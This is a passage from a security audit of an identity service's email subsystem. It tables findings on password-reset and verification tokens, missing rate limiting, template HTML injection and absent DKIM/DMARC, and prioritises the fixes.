  stores in Redis with 1h TTL
- `ConsumeResetToken` retrieves, deletes (single-use), and parses
  tenantID:userID from the stored value
- Token is hashed before storage (SHA-256 via `hashToken()`)

**What exists (`auth_service.go`):**
- `ForgotPassword` looks up credential by identifier, returns `nil`
  if not found (anti-enumeration)
- `ResetPassword` consumes token, validates password history, sets
  new password, revokes all sessions

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| P-01 | **No actual email sending in ForgotPassword** — `IssueResetToken` returns a token but it is never sent via email. The handler returns the token to the caller in the HTTP response (see `sendVerification` handler returning `"token": token`). In production this would leak reset tokens | **Critical** |
| P-02 | **Timing leak in ForgotPassword** — the "not found" path returns immediately, while the "found" path does a Redis write. An attacker can distinguish via response time | Medium |
| P-03 | **No rate limiting on ForgotPassword** — unlimited password reset requests can be made, flooding a victim's inbox or using GGID as an email amplification vector | High |
| P-04 | **Token returned in HTTP response** — `sendVerification` handler returns the token in the JSON response (`"token": token`). This is marked "dev mode only" but there is no environment check | High |

### 8.4 services/auth — Email Verification Flow

**What exists (`email_lockout.go`):**
- `EmailService.IssueVerificationToken` — 32-byte crypto/rand token,
  SHA-256 hashed, stored in Redis with 24h TTL
- `EmailService.VerifyEmailToken` — retrieves, deletes (single-use),
  parses tenantID:userID:email

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| V-01 | **No rate limiting on verification requests** — `sendVerification` handler does not rate limit per-email or per-IP | High |
| V-02 | **Token returned in HTTP response** — same as P-04, the verification token is returned in the JSON body | High |
| V-03 | **No actual email dispatch** — the token is generated but no email is sent via `pkg/email`; the handler expects the caller to deliver the link manually | Medium |
| V-04 | **Single-use enforcement is correct** — `VerifyEmailToken` deletes the key before returning, preventing replay | Info (good) |
| V-05 | **Token hashing is correct** — tokens are SHA-256 hashed before Redis storage, so a Redis dump doesn't reveal usable tokens | Info (good) |

### 8.5 SPF/DKIM/DMARC Configuration

| Check | Status |
|-------|--------|
| SPF record configuration | Not implemented — no DNS management code exists |
| DKIM signing on outbound | Not implemented — `SMTPSender` does not sign |
| DMARC policy enforcement | Not implemented — no DMARC record management |
| DKIM key generation/rotation | Not implemented |

---

## 9. Gap Analysis & Recommendations

### Priority Action Items

| # | Action | Effort | Impact |
|---|--------|--------|--------|
| 1 | **Fix HTML injection in templates.go** — Replace all string concatenation with HTML-escaped `fmt.Sprintf` or Go `html/template`. This is a critical security bug. | 2 hours | Prevents XSS in email clients, blocks phishing amplification |
| 2 | **Wire email sending into ForgotPassword and SendVerification flows** — Generate token, construct verification/reset URL, enqueue email via NATS queue, remove token from HTTP response. | 4 hours | Prevents token leakage, enables actual email delivery |
| 3 | **Add DKIM signing to SMTPSender** — Use `github.com/emersion/go-msgauth/dkim` to sign outbound mail. Store private key in config/KMS. Add `selector` and `domain` to `Config`. | 1 day | Prevents email spoofing, enables DMARC enforcement |
| 4 | **Add bounce/complaint handler + suppression list** — Implement `BounceHandler` with Redis-backed suppression list. Wire SES/SendGrid bounce webhooks to the handler. Check suppression before every send. | 1 day | Prevents sending to dead addresses, protects sender reputation |
| 5 | **Add rate limiting to email-trigger endpoints** — Limit `ForgotPassword` and `SendVerification` to 3 requests per email per hour, 10 per IP per hour, using the existing `RateLimiter`. | 2 hours | Prevents email bombing amplification attacks |

### Documentation & DNS Actions (Non-Code)

| Action | Detail |
|--------|--------|
| Publish SPF record | `ggid.dev. IN TXT "v=spf1 include:<relay-spf-domain> -all"` |
| Publish DKIM record | Generated by relay provider or during DKIM key creation |
| Publish DMARC record | Start with `p=none`, monitor aggregate reports, progress to `p=reject` |
| Set up FBL subscriptions | Via relay provider (SES, Postmark) for complaint notifications |

### Summary

GGID's email infrastructure has a solid foundation — the `Sender` interface,
SMTP/TLS support, and Redis-backed token storage are well-designed. However,
three critical gaps must be addressed before production use:

1. **Template injection** (T-01/T-02) is an active vulnerability that allows
   stored XSS through user display names.
2. **Missing email delivery** (P-01/V-03) means tokens are returned in HTTP
   responses rather than sent securely via email.
3. **Missing DKIM/DMARC** (E-01) means GGID emails are trivially spoofable
   by any mail server on the internet.

Addressing these three items brings the email subsystem from "development
prototype" to "production-ready IAM transactional email."
